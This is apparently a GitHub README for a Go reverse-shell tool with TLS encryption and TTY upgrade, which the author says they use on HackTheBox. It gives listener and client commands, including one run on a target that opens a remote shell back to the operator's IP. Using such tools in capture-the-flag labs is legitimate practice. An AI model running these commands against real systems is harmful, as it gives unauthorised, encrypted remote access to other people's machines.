# dshell
Simple golang reverse shell with encryption and tty upgrade. I use it for hackthebox.

## Usage
Download both files from the [release page](https://github.com/stacksparrow4/dshell/releases/tag/v0.1.0).
Upload dshellclient to the target.

On your linux host, run `./dshellserver -p PORT`.
On the target, run `./dshellclient YOURIP PORT`.

You should get a connection, with a TTY that supports tab autocomplete and clear screen with CTRL-L. The shell is plain text underneath TLS with x509 certificates.
